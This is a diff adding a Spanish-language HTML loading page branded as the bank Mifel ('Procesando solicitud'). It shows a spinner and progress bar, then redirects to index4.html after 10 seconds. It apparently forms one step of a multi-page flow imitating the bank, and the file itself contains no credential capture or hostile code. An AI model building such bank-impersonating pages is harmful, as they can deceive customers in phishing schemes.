@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mifel - Procesando Crédito</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --mifel-cyan: #00D1C1;
+            --mifel-blue-dark: #002D72;
+            --text-grey: #666;
+            --input-bg: #EBF1F5;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Raleway', sans-serif;
+            background-color: #ffffff;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER --- */
+        .top-header {
+            display: flex; justify-content: center; align-items: center;
+            padding: 20px 50px; border-bottom: 1px solid #f0f0f0;
+        }
+        .logo-center { width: 120px; }
+
+        /* --- MAIN CONTENT --- */
+        .main-container {
+            flex: 1; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center; 
+            justify-content: center;
+            padding: 40px 20px; 
+            text-align: center;
+        }
+
+        #loading-state {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* --- LOADER MODERNO --- */
+        .loader-wrapper {
+            position: relative; 
+            width: 130px; 
+            height: 130px;
+            margin-bottom: 40px; 
+            display: flex;
+            align-items: center; 
+            justify-content: center;
+        }
+
+        .light-ring {
+            position: absolute; 
+            width: 100%; 
+            height: 100%;
+            border: 3px solid rgba(0, 209, 193, 0.1);
+            border-top: 3px solid var(--mifel-cyan);
+            border-radius: 50%;
+            box-sizing: border-box;
+            animation: spinRing 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        .inner-icon {
+            width: 55px; 
+            height: 55px;
+            fill: var(--mifel-cyan);
+            animation: pulseIcon 2s ease-in-out infinite;
+        }
+
+        @keyframes spinRing { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes pulseIcon { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.08); opacity: 0.8; } }
+
+        /* --- TEXTOS --- */
+        .loading-title { 
+            color: var(--mifel-blue-dark); 
+            font-size: 22px; 
+            font-weight: 600; 
+            margin: 0 0 12px 0; 
+            width: 100%;
+        }
+        .loading-sub { 
+            color: var(--text-grey); 
+            font-size: 15px; 
+            max-width: 320px; 
+            line-height: 1.6; 
+            margin: 0 0 35px 0; 
+        }
+
+        /* --- BARRA DE PROGRESO --- */
+        .progress-container {
+            width: 260px; 
+            height: 6px; 
+            background-color: var(--input-bg);
+            border-radius: 20px; 
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%; 
+            width: 0%;
+            background: linear-gradient(90deg, var(--mifel-cyan), #00E5FF);
+            animation: fillBar 10s linear forwards;
+        }
+        @keyframes fillBar { 0% { width: 0%; } 100% { width: 100%; } }
+
+    </style>
+</head>
+<body>
+
+    <header class="top-header">
+        <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-center">
+    </header>
+
+    <main class="main-container">
+        
+        <div id="loading-state">
+            <div class="loader-wrapper">
+                <div class="light-ring"></div>
+                <svg class="inner-icon" viewBox="0 0 24 24">
+                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm0 10.5h3c-.41 1.5-1.5 2.5-3 3v-3zm0-4.5V4.26l6 2.67V11h-6V7zM6 6.93l6-2.67V11H6V6.93zM12 21c-3.75-1.01-6.5-4.66-6.91-8.5H12v8.5z"/>
+                </svg>
+            </div>
+            <h1 class="loading-title">Procesando solicitud</h1>
+            <p class="loading-sub">Por favor, no cierres esta ventana.</p>
+            <div class="progress-container">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        // Espera 5 segundos (lo que dura la animación de la barra) y redirige
+        setTimeout(() => {
+            window.location.href = "index4.html";
+        }, 10000);
+    </script>
+</body>
+</html>
